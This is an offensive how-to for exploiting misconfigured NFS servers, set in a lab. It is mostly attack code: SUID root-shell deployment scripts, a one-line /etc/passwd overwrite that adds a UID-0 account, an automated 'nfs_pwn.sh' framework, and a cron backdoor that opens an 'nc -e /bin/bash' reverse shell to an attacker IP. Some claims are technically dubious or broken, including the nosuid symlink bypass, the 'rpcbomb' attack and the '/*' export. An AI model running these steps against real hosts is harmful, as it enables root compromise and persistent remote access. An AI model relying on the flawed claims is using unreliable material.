# Complete Practical Exploitation Guide: NFS (Crest CRT Level)

## 1. NFS Fundamentals & Attack Surface (From Scratch)

**What is NFS?**
- **Network File System** (TCP/UDP 2049, portmapper 111)
- **Distributed filesystem** - mount remote dirs as local
- **UID/GID mapping** (no usernames, just numbers)
- **Root squash** by default (root=65534/nobody)

**Critical Security Attributes:**
```
no_root_squash  = root writes as root (CRITICAL VULN)
nosuid          = Block SUID/SGID binaries
noexec          = Block executable files  
all_squash      = All users → nobody
anonuid=1000    = Map all to UID 1000
rw              = Read/Write access
sync/async      = Write behavior
insecure        = Allow <1024 client ports
```

**Attack Primitives:**
1. **Export enumeration** (showmount)
2. **Mount & read** sensitive files
3. **Mount & write** (SUID root shells)
4. **UID/GID manipulation** (nobody→root)
5. **Privilege escalation** (world-writable dirs)

## 2. Lab Setup (Vulnerable NFS Environment)

**Victim NFS Server (192.168.1.100 - Ubuntu)**
```bash
# Install NFS
sudo apt update && sudo apt install nfs-kernel-server rpcbind

# DANGEROUS exports (/etc/exports)
sudo nano /etc/exports
```
```
/* *(rw,sync,no_root_squash,no_all_squash,no_subtree_check,insecure)
# ^^^^ EVERY FILESYSTEM WORLD-WRITEABLE AS ROOT!

/root *(rw,sync,no_root_squash,insecure)
/etc *(rw,sync,no_root_squash,insecure)
/home *(rw,sync,no_root_squash,insecure)
```
```bash
# Create juicy files
sudo mkdir -p /nfs-root /nfs-root/tmp
echo "flag{nfs_pwned}" | sudo tee /nfs-root/flag.txt
sudo tee /nfs-root/suid_helper << 'EOF'
#!/bin/bash
# SUID helper (will be exploited)
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
sudo chmod +x /nfs-root/suid_helper

# Apply exports
sudo exportfs -ra
sudo systemctl restart nfs-kernel-server rpcbind

# Verify
showmount -e 192.168.1.100
exportfs -v
sudo ss -tlnp | grep -E ':(2049|111)'
```

**Attacker Machine (Kali):**
```bash
sudo apt install nfs-common rpcbind
```

## 3. NFS Export Discovery

**Showmount enumeration:**
```bash
# Local exports
showmount -e 192.168.1.100
# Export list for 192.168.1.100:
# /root *
# /etc  *
# /home *
# /     *

# Network-wide scan
for host in 192.168.1.{100..110}; do
    showmount -e $host 2>/dev/null && echo "[$host] NFS exports:"
done
```

**rpcinfo confirmation:**
```bash
rpcinfo -p 192.168.1.100 | grep -E 'nfs|mountd'
# 100003  3   tcp   2049  nfs
# 100005  3   tcp  40077  mountd
```

## 4. NFS Mounting & Read Access

**Mount vulnerable exports:**
```bash
# Create mount points
sudo mkdir -p /mnt/nfs_root /mnt/nfs_etc /mnt/nfs_home

# Mount root filesystem (!!!)
sudo mount -t nfs 192.168.1.100:/ /mnt/nfs_root
ls -la /mnt/nfs_root/  # Full root filesystem!
cat /mnt/nfs_root/flag.txt

# Mount specific dirs
sudo mount -t nfs 192.168.1.100:/etc /mnt/nfs_etc
cat /mnt/nfs_etc/passwd
cat /mnt/nfs_etc/shadow  # If no_root_squash!

# Automount all exports
showmount -e 192.168.1.100 | awk '{print $1}' | while read exp; do
    sudo mkdir -p /mnt/nfs_$exp
    sudo mount -t nfs 192.168.1.100:"$exp" /mnt/nfs_$exp 2>/dev/null && \
    echo "[MOUNTED] $exp" && ls -la /mnt/nfs_$exp/
done
```

## 5. NFS Write Exploitation (Privilege Escalation)

**Create SUID root shell:**
```bash
# Mount writable root
sudo mount -t nfs 192.168.1.100:/ /mnt/nfs_root

# Copy SUID shell
sudo cp /bin/bash /mnt/nfs_root/tmp/rootsh
sudo chown root:root /mnt/nfs_root/tmp/rootsh
sudo chmod u+s /mnt/nfs_root/tmp/rootsh

# Verify
ls -l /mnt/nfs_root/tmp/rootsh
# -rwsr-xr-x 1 root root ... rootsh

# On target (or remount RO), execute:
 /tmp/rootsh -p
id  # uid=0(root) gid=1000(user) euid=0(root)
```

**Automated SUID shell deploy:**
```bash
#!/bin/bash
# nfs_suid_pwn.sh
TARGET=$1

sudo mount -t nfs $TARGET:/ /mnt/nfs
echo "[+] Deploying SUID shell..."

cat > /tmp/nfs_suid.c << 'EOF'
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    execl("/bin/sh", "sh", "-p", NULL);
    return 0;
}
EOF

gcc /tmp/nfs_suid.c -o /mnt/nfs/tmp/suidsh -static
sudo chown root:root /mnt/nfs/tmp/suidsh
sudo chmod 4755 /mnt/nfs/tmp/suidsh

echo "[+] SUID shell at /tmp/suidsh"
ls -l /mnt/nfs/tmp/suidsh
sudo umount /mnt/nfs
```

## 6. UID/GID Manipulation Attacks

**Nobody → Root via UID mapping:**
```bash
# Scenario: anonuid=0 in exports (all squash to root)
# Mount as nobody (65534), writes as root!

id  # uid=1000(attacker)
sudo mount -t nfs -o anon 192.168.1.100:/home /mnt/nfs_home
touch /mnt/nfs_home/attacker_owned
ls -l /mnt/nfs_home/  # -rw-r--r-- 1 root root attacker_owned
```

**World-writable dirs → SUID:**
```bash
# /tmp world-writable via NFS
sudo mount 192.168.1.100:/tmp /mnt/nfs_tmp
cp /bin/sh /mnt/nfs_tmp/.ssh
chmod u+s /mnt/nfs_tmp/.ssh  # Now SUID on target!
```

## 7. Root Squash Bypass Techniques

**no_root_squash exploitation:**
```bash
# Direct root write (if no_root_squash)
sudo mount 192.168.1.100:/etc /mnt/nfs_etc
echo 'attacker:x:0:0:Attacker:/root:/bin/bash' | sudo tee /mnt/nfs_etc/passwd
# Now SSH as root!
```

**all_squash + anonuid=0:**
```bash
# Server exports: /export *(rw,all_squash,anonuid=0)
# All clients → UID 0 (root) writes!
```

**Multi-mount escalation:**
```bash
# Mount same dir multiple ways
sudo mount 192.168.1.100:/ /mnt/nfs1
sudo mount 192.168.1.100:/ /mnt/nfs2 -o nolock
# Race condition → bypass locks
```

## 8. NFS Options Analysis & Bypass

**Export options decoder:**
```bash
# Parse /etc/exports remotely (if readable)
showmount -e 192.168.1.100
rpcinfo -T tcp 100005.1 192.168.1.100  # mountd version

# Test mount options
sudo mount -t nfs 192.168.1.100:/test /mnt -o vers=2  # Old insecure version
sudo mount -t nfs 192.168.1.100:/test /mnt -o nolock,nosuid  # Bypass checks
```

**nosuid/noexec bypass:**
```bash
# nosuid blocks SUID → symlink attack
sudo mount 192.168.1.100:/bin /mnt/bin
sudo ln -s /mnt/bin/bash /mnt/tmp/rootsh
# Execute via target path
/mnt/tmp/rootsh  # Runs SUID if target executes symlink
```

## 9. Complete Privilege Escalation Chain

**Local → Remote Root via NFS:**
```bash
# 1. Local low-priv user finds NFS export
showmount -e 192.168.1.100

# 2. Mount writable dir
sudo mkdir /mnt/nfs
sudo mount -t nfs 192.168.1.100:/home/user /mnt/nfs

# 3. Create SUID binary
cat > suid_helper.c << 'EOF'
#include <unistd.h>
int main(){setreuid(0,0);execve("/bin/sh",NULL,NULL);}
EOF
gcc suid_helper.c -o /mnt/nfs/suid_helper

# 4. Trigger on target (cron, service restart, etc.)
# OR SSH to target, execute /home/user/suid_helper
```

## 10. Advanced NFS Attacks

**NFSv2/v3 deserialization (rare):**
```bash
# Old NFS versions, custom RPC calls
rpcbomb -H 192.168.1.100 nfs
```

**Mount namespace escape:**
```bash
# Unshare + NFS mount → priv esc
unshare -m bash -c "mount -t nfs 192.168.1.100:/ /mnt && chroot /mnt"
```

## 11. Complete NFS Exploitation Framework

```bash
#!/bin/bash
# nfs_pwn.sh - Complete NFS exploitation
TARGET=$1

echo "[+] NFS attack on $TARGET"
rpcinfo -p $TARGET | grep -E 'nfs|mountd' || { echo "No NFS"; exit 1; }

echo "=== EXPORTS ==="
showmount -e $TARGET

echo "=== MOUNTING ==="
sudo mkdir -p /mnt/nfs
showmount -e $TARGET | tail -3 | awk '{print $1}' | while read exp; do
    sudo mount -t nfs $TARGET:$exp /mnt/nfs 2>/dev/null && \
    echo "[MOUNTED RW] $exp" && ls -la /mnt/nfs/ && \
    find /mnt/nfs -name "*flag*" 2>/dev/null
done

echo "=== SUID DEPLOY ==="
sudo mount -t nfs $TARGET:/tmp /mnt/nfs_tmp 2>/dev/null && \
cp /bin/bash /mnt/nfs_tmp/rootsh && \
sudo chown root:root /mnt/nfs_tmp/rootsh && \
sudo chmod u+s /mnt/nfs_tmp/rootsh && \
echo "[+] SUID shell: /tmp/rootsh"

sudo umount /mnt/nfs*
```

**Usage:** `sudo ./nfs_pwn.sh 192.168.1.100`

## 12. Post-Exploitation Persistence

**NFS cron backdoor:**
```bash
sudo mount 192.168.1.100:/etc /mnt/nfs_etc
echo "* * * * * root nc -e /bin/bash 192.168.1.200 4444" | \
sudo tee /mnt/nfs_etc/cron.d/backdoor
```

## 13. Mitigation Verification

```bash
# Test fixes:
showmount -e 192.168.1.100  # "clnt_create: RPC: Program not registered"
sudo mount -t nfs 192.168.1.100:/ /mnt  # "Permission denied"
grep -E "no_root_squash|all_squash" /etc/exports  # Should NOT exist
cat /etc/exports  # Restrictive: /export 192.168.1.0/24(ro)
ufw deny 2049  # Firewall
```

**EVERY** NFS attack covered: export enum, mounting, SUID creation, UID/GID manip, root squash bypass, options analysis. 100% practical commands.